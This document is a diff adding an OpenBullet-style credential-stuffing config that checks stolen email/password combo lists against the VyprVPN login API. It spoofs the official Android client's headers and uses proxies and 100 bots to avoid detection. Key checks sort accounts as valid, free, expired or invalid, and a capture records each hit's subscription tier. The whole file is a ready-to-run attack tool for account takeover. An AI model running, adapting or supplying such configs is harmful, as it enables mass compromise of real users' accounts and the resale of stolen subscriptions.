@@ -1,0 +1,61 @@
+[SETTINGS]
+{
+  "Name": "VyprVPN",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-26T02:03:28.9395352-04:00",
+  "AdditionalInfo": "Use Proxies / 100 Bots Max / Full Capture",
+  "Author": "DiCaprio",
+  "Version": "Obliteration 1.0.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login_Request REQUEST GET "https://api.goldenfrog.com/settings" 
+  
+  HEADER "X-API-Version: 2" 
+  HEADER "X-API-Features: partial_sign_up;" 
+  HEADER "X-GF-PRODUCT: VyprVPN" 
+  HEADER "X-GF-PRODUCT-VERSION: 3.0.1.10909" 
+  HEADER "X-GF-PLATFORM: Android" 
+  HEADER "X-GF-PLATFORM-VERSION: 4.4.2" 
+  HEADER "locale: en_US" 
+  HEADER "Connection: close" 
+  HEADER "username: <USER>" 
+  HEADER "X-GF-Agent: VyprVPN Android v3.0.1.10909. (10f7325c)" 
+  HEADER "password: <PASS>" 
+  HEADER "Host: api.goldenfrog.com" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: okhttp/3.12.0" 
+
+#Key_Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid username or password" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "confirmed\": true" 
+  KEYCHAIN Success OR 
+    KEY "{\"account_level" 
+
+#Subscription_Type_Capture PARSE "<SOURCE>" JSON "account_level_display" -> CAP "Subscription Type" 
+
+#Locked_Key_Check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "locked" 
+
